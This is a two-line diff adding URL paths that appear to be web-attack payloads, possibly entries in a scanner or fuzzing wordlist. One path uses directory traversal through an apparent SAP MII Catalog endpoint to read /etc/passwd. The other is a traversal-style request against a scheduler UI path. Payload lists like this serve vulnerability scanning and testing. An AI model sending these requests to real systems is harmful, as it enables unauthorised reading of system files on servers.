@@ -1,0 +1,2 @@
+/XMII/Catalog?Mode=GetFileList&Path=Classes/../../../../../../../../../../../../etc/passwd
+/scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS?/..
